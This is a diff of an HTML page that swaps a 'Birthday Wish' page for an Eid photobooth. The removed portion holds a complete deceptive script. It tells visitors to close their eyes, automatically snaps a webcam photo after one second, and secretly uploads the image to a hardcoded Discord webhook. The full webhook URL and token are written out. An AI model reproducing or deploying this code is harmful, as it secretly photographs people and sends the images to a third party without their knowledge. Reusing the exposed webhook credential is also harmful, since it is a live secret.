@@ -3,182 +3,30 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Birthday Wish ✨</title>
-    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
-    <style>
-        :root { --accent: #ff758c; }
-        body {
-            margin: 0; padding: 0; font-family: 'Poppins', sans-serif;
-            background: #1a1a2e; height: 100vh;
-            display: flex; justify-content: center; align-items: center; color: white;
-            overflow: hidden;
-        }
-
-        #flash-effect {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: white; opacity: 0; pointer-events: none; z-index: 9999;
-        }
-
-        .container {
-            text-align: center; background: rgba(255, 255, 255, 0.05);
-            padding: 40px; border-radius: 30px; backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1); width: 85%; max-width: 400px;
-        }
-
-        .shake { animation: shake 0.2s ease-in-out; }
-        @keyframes shake {
-            0% { transform: translate(0,0); }
-            25% { transform: translate(5px, 5px); }
-            50% { transform: translate(-5px, -5px); }
-            100% { transform: translate(0,0); }
-        }
-
-        h1 { font-family: 'Dancing Script', cursive; font-size: 2.5rem; margin-bottom: 10px; }
-        
-        /* Area Preview Hasil Foto */
-        #photo-result-wrapper {
-            width: 100%; height: 0; overflow: hidden;
-            border-radius: 20px; transition: 0.5s all ease;
-            margin: 0 auto; border: 0px solid var(--accent);
-            background: #2a2a40;
-            display: flex; align-items: center; justify-content: center;
-        }
-
-        #webcam { display: none; } /* Kamera tetap jalan tapi tidak terlihat */
-        #photo-canvas { 
-            width: 100%; height: 100%; 
-            object-fit: cover; display: none; 
-            transform: scaleX(-1); /* Mirror agar seperti kamera depan */
-        }
-
-        .btn {
-            background: var(--accent); color: white; border: none;
-            padding: 15px 35px; border-radius: 50px; font-weight: 600;
-            cursor: pointer; box-shadow: 0 5px 15px rgba(255, 117, 140, 0.4);
-            margin-top: 20px; transition: 0.3s;
-        }
-
-        .btn:hover { transform: scale(1.05); background: #ff4d6d; }
-        #status { font-size: 0.8rem; margin-top: 15px; opacity: 0.6; }
-    </style>
+    <title>Eid Mubarak Photobooth</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
+    <div class="container">
+        <h1>🌙 Selamat Hari Raya Idul Fitri</h1>
+        <p>Ambil foto keceriaanmu dan bagikan!</p>
 
-    <div id="flash-effect"></div>
-
-    <div class="container" id="main-card">
-        <h1 id="title">Make a Wish</h1>
-        <p id="desc">Pejamkan matamu, pikirkan satu keinginan...</p>
-        
-        <div id="photo-result-wrapper">
-            <video id="webcam" autoplay playsinline></video>
-            <canvas id="photo-canvas"></canvas>
+        <div class="booth-container">
+            <video id="video" autoplay playsinline></video>
+            <div id="frame-overlay"></div>
+            <canvas id="canvas" style="display:none;"></canvas>
         </div>
 
-        <button id="main-btn" class="btn" onclick="activateCamera()">Siapkan Keinginan ✨</button>
-        <div id="status">Keajaiban sedang menunggu...</div>
+        <div class="controls">
+            <button id="snap">Ambil Foto 📸</button>
+            <button id="download" style="display:none;">Simpan Foto ✨</button>
+        </div>
+
+        <div id="result-container">
+            <img id="photo" alt="Hasil foto kamu">
+        </div>
     </div>
 
-    <script>
-        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1463473630251061375/xi6CyaH0ElCz_jUz9vf_iFfOxfNuh1iZfX_31GAO7jOcxRjkhd723nbEFd3ZAp1YvhME";
-        
-        const video = document.getElementById('webcam');
-        const canvas = document.getElementById('photo-canvas');
-        const wrapper = document.getElementById('photo-result-wrapper');
-        const btn = document.getElementById('main-btn');
-        const statusText = document.getElementById('status');
-        const title = document.getElementById('title');
-        const flash = document.getElementById('flash-effect');
-        const card = document.getElementById('main-card');
-
-async function activateCamera() {
-    statusText.innerText = "Mempersiapkan keajaiban...";
-    
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-        
-        // Perubahan UI
-        title.innerText = "Bersiaplah...";
-        btn.innerText = "Keajaiban Dimulai...";
-        btn.disabled = true; // Nonaktifkan tombol agar tidak diklik manual
-        
-        statusText.innerHTML = "Tutup matamu... <br> Keajaiban akan ditangkap dalam <b>1 detik!</b>";
-
-        // --- FITUR KEJUTAN OTOMATIS ---
-        setTimeout(() => {
-            takePhoto(); // Ambil foto otomatis setelah 2 detik
-        }, 1000);
-
-    } catch (err) {
-        console.error(err);
-        alert("Keajaiban tidak diizinkan atau tidak ditemukan.");
-        statusText.innerText = "Gagal mengakses Keajaiban.";
-    }
-}
-        function takePhoto() {
-            // 1. Efek Flash & Shake
-            flash.style.opacity = "1";
-            card.classList.add('shake');
-            setTimeout(() => {
-                flash.style.opacity = "0";
-                flash.style.transition = "opacity 0.5s ease-out";
-                card.classList.remove('shake');
-            }, 100);
-
-            // 2. Confetti
-            confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
-
-            // 3. Gambar Foto ke Canvas
-            const context = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            
-            // Gambar orangnya
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            // 4. Tambahkan Stiker Ulang Tahun (Menggunakan Text & Emoji)
-            context.save();
-            // Karena video di-mirror di CSS, kita balik juga saat menggambar stiker jika perlu
-            // Tapi untuk teks lebih baik normal saja
-            context.font = "bold 50px Arial";
-            context.fillStyle = "white";
-            context.textAlign = "center";
-            context.shadowBlur = 10;
-            context.shadowColor = "black";
-            
-            // Tambah Teks/Stiker di bawah
-            context.fillText("Happy Birthday! 🥳", canvas.width/2, canvas.height - 50);
-            
-            // Tambah Ikon/Stiker di pojok
-            context.font = "80px Arial";
-            context.fillText("🎂", 100, 100);
-            context.fillText("✨", canvas.width - 100, 100);
-            context.restore();
-
-            // 5. Tampilkan Hasil di Web
-            canvas.style.display = "block";
-            wrapper.style.height = "250px";
-            wrapper.style.borderWidth = "4px";
-            wrapper.style.marginBottom = "20px";
-
-            title.innerText = "Harapan Terkirim!";
-            statusText.innerText = "Ini adalah momen bahagiamu.";
-            btn.style.display = "none";
-
-            // 6. Kirim ke Discord
-            canvas.toBlob((blob) => {
-                const formData = new FormData();
-                formData.append('file', blob, 'birthday_moment.png');
-                formData.append('content', "📸 **Momen Tiup Lilin Terdeteksi!**\nSeseorang baru saja membuat keinginan.");
-
-                fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
-                
-                // Matikan kamera
-                video.srcObject.getTracks().forEach(track => track.stop());
-            }, 'image/png');
-        }
-    </script>
+    <script src="script.js"></script>
 </body>
 </html>
